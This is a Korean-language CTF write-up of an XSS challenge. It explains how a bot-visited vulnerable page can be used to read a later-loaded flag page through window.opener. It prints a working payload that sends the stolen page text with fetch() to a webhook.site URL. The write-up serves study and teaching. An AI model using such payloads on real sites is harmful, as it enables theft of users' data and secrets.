---
tier: "\bSilver 1"
topics:
  - "\bXSS"
solved-with: AI-Hint
---
### 문제 구조

- `/vuln`: param 쿼리 파라미터를 받아서 HTML에 삽입함. XSS 취약점이 존재
- `/flag`: 서버에서 랜덤으로 생성된 password를 검사하고 일치하는 경우에만 FLAG를 반환함. 
- `/test`: 폼에 데이터를 넣고 POST 요청을 보내면
	1. `http://127.0.0.1:8000/vuln?param={사용자입력}` 경로를 url로 생성
	2. 셀레니움으로 크롬 브라우저를 열어서 해당 url에 접속 
	3. 2초 뒤에 `http://127.0.0.1:8000/flag?password={secret_password}`에 접속 


### 나의 시도

서버에서 `/flag`로 접근하는 방법 외에는 플래그를 가져오는 방법이 없는데 내가 XSS 스크립트를 작성한다고 해도 `/vuln`에서 실행되고 2초 뒤에 `/flag` 페이지로 넘어가기 때문에 방법이 없다고 생각했음. 

### 풀이 과정

1. XSS를 이용해 `window.open()`으로 새로운 창 생성
2. 새 창에서 `setTimeout()`으로 2초 뒤에 올라오는 `/flag`에 접근하는 자바스크립트 실행
3. `/flag`의 반환값인 플래그를 `window.opener.document.body.innerText`로 접근
4. `fetch()`로 Webhook.site에 플래그 전송

``` html
<script>
    window.open("/vuln?param=%3Cscript%3EsetTimeout(() => {fetch(`https://webhook.site/123?param=${window.opener.document.body.innerText}`)}, 2500);%3C/script%3E");
</script>
```

다른 사람의 풀이에서는 `window.open()`으로 `about:blank` 페이지를 열고 `document.write()`로 스크립트를 삽입하는 방식을 사용함.

### 새로운 개념

#### `window.open()`, `window.opener`

- 새로운 창을 생성하고 창 사이의 참조를 이용할 수 있음.
- 동일 출처 조건을 만족하면 다른 창의 `document`에 접근할 수 있음.
- 기존 창이 이동해도 별도로 열린 창의 JavaScript는 계속 실행될 수 있음.

#### `about:blank`, `document.write()`

- `window.open()`으로 생성한 초기 `about:blank` 문서는 일반적으로 기존 창의 Origin을 상속함.
- `document.write()`를 통해 새 창의 HTML 문서에 직접 내용을 작성할 수 있음.

#### URL 인코딩

- URL 쿼리 파라미터를 폼 방식으로 디코딩할 때 `+`가 공백으로 변환될 수 있음.
- 리터럴 `+`를 전달하려면 `%2B`로 인코딩해야 함.
- 아니면 백틱과 `${}`를 사용하면 됨. 

#### HTML 파싱과 JavaScript 문자열 이스케이프

HTML의 `<script>` 태그 내부에 JavaScript 문자열로 `</script>`를 직접 작성하면, HTML 파서가 이를 실제 종료 태그로 인식하여 바깥쪽 스크립트를 조기에 종료할 수 있다.

이를 방지하는 방법은 다음과 같다.

- `<\/script>`: **JavaScript 문자열에서 `\/`는 `/`로 해석되지만, HTML 파서는 이를 종료 태그로 인식하지 않음.**
- `%3C/script%3E`: URL 인코딩으로 `<`와 `>`를 표현, URL 쿼리 파라미터로 전달한 뒤 서버에서 디코딩하면 정상적인 `</script>`가 됨.

이번 문제에서는 `window.open()`에 전달하는 URL에 `%3Cscript%3E...%3C/script%3E`를 사용했으므로, 바깥쪽 스크립트가 조기 종료되지 않으면서 새로운 `/vuln` 페이지에서는 정상적인 `<script>` 태그가 실행됐음. 
